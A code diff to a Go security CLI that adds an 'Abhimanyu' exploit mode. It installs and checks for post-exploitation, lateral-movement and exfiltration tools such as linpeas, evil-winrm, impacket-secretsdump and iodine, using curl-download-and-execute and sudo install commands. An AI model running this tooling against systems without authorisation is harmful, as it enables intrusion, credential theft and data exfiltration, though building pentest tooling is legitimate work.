+			{"hashcat", "exploit", "sudo apt install hashcat -y", false, false},
+			// ── Abhimanyu Phase 3 — CVE/Exploit Search ─────────────────────────
+			{"searchsploit", "exploit", "sudo apt install exploitdb -y", false, false},
+			{"msfconsole", "exploit", "sudo apt install metasploit-framework -y", false, false},
+			// ── Abhimanyu Phase 4 — Post-Exploitation ──────────────────────────
+			{"linpeas", "exploit", "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh && chmod +x /opt/linpeas.sh && sudo ln -sf /opt/linpeas.sh /usr/local/bin/linpeas", false, false},
+			{"pspy", "exploit", "curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /opt/pspy && chmod +x /opt/pspy && sudo ln -sf /opt/pspy /usr/local/bin/pspy", false, false},
+			{"bloodhound-python", "exploit", "pip3 install bloodhound --break-system-packages && sudo apt install neo4j -y", false, false},
+			// ── Abhimanyu Phase 5 — Lateral Movement ───────────────────────────
+			{"crackmapexec", "exploit", "sudo apt install crackmapexec -y", false, false},
+			{"evil-winrm", "exploit", "sudo gem install evil-winrm", false, false},
+			{"impacket-secretsdump", "exploit", "sudo apt install python3-impacket -y", false, false},
+			// ── Abhimanyu Phase 6 — Persistence + Exfil ────────────────────────
+			{"iodine", "exploit", "sudo apt install iodine -y", false, false},
 		}
 
 		var missing []toolEntry
 		reconOK := 0
 		huntOK := 0
+		exploitOK := 0
 
-		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  RECON TOOLS (17):"))
+		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(cyan).Render("  RECON TOOLS (20):"))
 		for _, t := range allTools {
 			if t.mode != "recon" {
 				continue
 			}
 			if _, err := exec.LookPath(t.name); err == nil {
-				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", t.name)))
+				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-20s installed", t.name)))
 				reconOK++
 			} else {
-				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s MISSING", t.name)))
+				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-20s MISSING", t.name)))
 				missing = append(missing, t)
-				reconOK-- // offset the increment that didn't happen
 			}
 		}
 
 		fmt.Println()
-		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  HUNT TOOLS (8):"))
+		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("#FF6600")).Render("  HUNT TOOLS (11):"))
 		for _, t := range allTools {
 			if t.mode != "hunt" {
 				continue
 			}
 			if _, err := exec.LookPath(t.name); err == nil {
-				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-16s installed", t.name)))
+				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-20s installed", t.name)))
 				huntOK++
 			} else {
-				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-16s MISSING", t.name)))
+				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-20s MISSING", t.name)))
+				missing = append(missing, t)
+			}
+		}
+
+		fmt.Println()
+		fmt.Println(lipgloss.NewStyle().Bold(true).Foreground(red).Render("  ABHIMANYU EXPLOIT TOOLS (13):"))
+		for _, t := range allTools {
+			if t.mode != "exploit" {
+				continue
+			}
+			if _, err := exec.LookPath(t.name); err == nil {
+				fmt.Println(lipgloss.NewStyle().Foreground(green).Render(fmt.Sprintf("  ✓ %-20s installed", t.name)))
+				exploitOK++
+			} else {
+				fmt.Println(lipgloss.NewStyle().Foreground(red).Render(fmt.Sprintf("  ✗ %-20s MISSING", t.name)))
 				missing = append(missing, t)
 			}
 		}
@@ -1271,9 +1418,11 @@ func main() {
 		fmt.Println()
 		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#333333")).Render("  " + strings.Repeat("─", 60)))
 		fmt.Println(lipgloss.NewStyle().Foreground(green).Render(
-			fmt.Sprintf("  Recon: %d/17 installed", reconOK)))
+			fmt.Sprintf("  Recon:     %d/20 installed", reconOK)))
 		fmt.Println(lipgloss.NewStyle().Foreground(lipgloss.Color("#FF6600")).Render(
-			fmt.Sprintf("  Hunt:  %d/8 installed", huntOK)))
+			fmt.Sprintf("  Hunt:      %d/11 installed", huntOK)))
+		fmt.Println(lipgloss.NewStyle().Foreground(red).Render(
+			fmt.Sprintf("  Abhimanyu: %d/13 installed", exploitOK)))
 
 		if len(missing) == 0 {
 			fmt.Println()
@@ -1337,41 +1486,42 @@ func main() {
 					)
 
 				case "waymore":
-					cmd2 := exec.Command("go", "install", "github.com/xnl-h4ck3r/waymore@latest")
-					cmd2.Stdout = os.Stdout
-					cmd2.Stderr = os.Stderr
-					installErr = cmd2.Run()
-					if installErr == nil {
-						homedir2, _ := os.UserHomeDir()
-						for _, gobin := range []string{homedir2 + "/go/bin/waymore", "/root/go/bin/waymore"} {
-							if _, err2 := os.Stat(gobin); err2 == nil {
-								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/waymore").Run()
-								break
+					// waymore is a Python tool — pip3 install (NOT go install)
+					installErr = func() error {
+						cmd2 := exec.Command("pip3", "install", "waymore", "--break-system-packages", "-q")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						if err := cmd2.Run(); err == nil {
+							for _, p := range []string{"/usr/local/bin/waymore", "/usr/bin/waymore"} {
+								if _, e := os.Stat(p); e == nil {
+									return nil
+								}
 							}
 						}
-					}
-
-				case "gospider":
-					cmd2 := exec.Command("go", "install", "github.com/jaeles-project/gospider@latest")
-					cmd2.Stdout = os.Stdout
-					cmd2.Stderr = os.Stderr
-					installErr = cmd2.Run()
-					if installErr == nil {
-						homedir2, _ := os.UserHomeDir()
-						for _, gobin := range []string{homedir2 + "/go/bin/gospider", "/root/go/bin/gospider"} {
-							if _, err2 := os.Stat(gobin); err2 == nil {
-								exec.Command("sudo", "ln", "-sf", gobin, "/usr/local/bin/gospider").Run()
-								break
-							}
+						// Method 2: git clone
+						exec.Command("sudo", "rm", "-rf", "/opt/waymore").Run()
+						cloneCmd := exec.Command("git", "clone", "--depth=1", "https://github.com/xnl-h4ck3r/waymore.git", "/opt/waymore")
+						cloneCmd.Stdout = os.Stdout
+						cloneCmd.Stderr = os.Stderr
+						if err := cloneCmd.Run(); err != nil {
+							return err
 						}
-					}
+						exec.Command("pip3", "install", "-r", "/opt/waymore/requirements.txt", "--break-system-packages", "-q").Run()
+						teeCmd := exec.Command("sudo", "tee", "/usr/local/bin/waymore")
+						teeCmd.Stdin = strings.NewReader("#!/bin/bash\npython3 /opt/waymore/waymore.py \"$@\"\n")
+						teeCmd.Run()
+						exec.Command("sudo", "chmod", "+x", "/usr/local/bin/waymore").Run()
+						return nil
+					}()
 
 				case "gf":
-					cmd2 := exec.Command("go", "install", "github.com/tomnomnom/gf@latest")
-					cmd2.Stdout = os.Stdout
-					cmd2.Stderr = os.Stderr
-					installErr = cmd2.Run()
-					if installErr == nil {
+					installErr = func() error {
+						cmd2 := exec.Command("go", "install", "github.com/tomnomnom/gf@latest")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						if err := cmd2.Run(); err != nil {
+							return err
+						}
 						homedir2, _ := os.UserHomeDir()
 						for _, gobin := range []string{homedir2 + "/go/bin/gf", "/root/go/bin/gf"} {
 							if _, err2 := os.Stat(gobin); err2 == nil {
@@ -1380,10 +1530,68 @@ func main() {
 							}
 						}
 						// Install gf patterns
-						exec.Command("bash", "-c",
-							"git clone --depth=1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gf-patterns 2>/dev/null; "+
-								"mkdir -p ~/.gf; cp /tmp/gf-patterns/*.json ~/.gf/ 2>/dev/null || true").Run()
-					}
+						gfDir := homedir2 + "/.gf"
+						if _, err2 := os.Stat(gfDir); err2 != nil {
+							exec.Command("git", "clone", "--depth=1", "https://github.com/1ndianl33t/Gf-Patterns", gfDir).Run()
+						}
+						return nil
+					}()
+
+				case "linpeas":
+					installErr = func() error {
+						cmd2 := exec.Command("bash", "-c",
+							"curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh && chmod +x /opt/linpeas.sh && sudo ln -sf /opt/linpeas.sh /usr/local/bin/linpeas")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						return cmd2.Run()
+					}()
+
+				case "pspy":
+					installErr = func() error {
+						cmd2 := exec.Command("bash", "-c",
+							"curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /opt/pspy && chmod +x /opt/pspy && sudo ln -sf /opt/pspy /usr/local/bin/pspy")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						return cmd2.Run()
+					}()
+
+				case "bloodhound-python":
+					installErr = func() error {
+						exec.Command("pip3", "install", "bloodhound", "--break-system-packages", "-q").Run()
+						exec.Command("sudo", "apt", "install", "-y", "neo4j", "-qq").Run()
+						return nil
+					}()
+
+				case "evil-winrm":
+					installErr = func() error {
+						exec.Command("sudo", "apt", "install", "-y", "ruby", "ruby-dev", "-qq").Run()
+						cmd2 := exec.Command("sudo", "gem", "install", "evil-winrm")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						return cmd2.Run()
+					}()
+
+				case "impacket-secretsdump":
+					installErr = func() error {
+						cmd2 := exec.Command("sudo", "apt", "install", "-y", "python3-impacket")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						if err := cmd2.Run(); err == nil {
+							return nil
+						}
+						cmd3 := exec.Command("pip3", "install", "impacket", "--break-system-packages", "-q")
+						cmd3.Stdout = os.Stdout
+						cmd3.Stderr = os.Stderr
+						return cmd3.Run()
+					}()
+
+				case "iodine":
+					installErr = func() error {
+						cmd2 := exec.Command("sudo", "apt", "install", "-y", "iodine")
+						cmd2.Stdout = os.Stdout
+						cmd2.Stderr = os.Stderr
+						return cmd2.Run()
+					}()
 
 				default:
 					if t.isCargo {
@@ -1712,7 +1920,7 @@ func main() {
 			printError("Usage: cybermind /abhimanyu <target> [vuln-type]")
 			printError("Example: cybermind /abhimanyu example.com all")
 			printError("Example: cybermind /abhimanyu example.com sqli")
-			printError("Vuln types: all, xss, sqli, ssrf, lfi, rce, cmdi, auth, network")
+			printError("Vuln types: all, xss, sqli, ssrf, lfi, rce, cmdi, auth, network, postexploit, lateral, exfil")
 			os.Exit(1)
 		}
 		abhimanyuTarget := args[1]
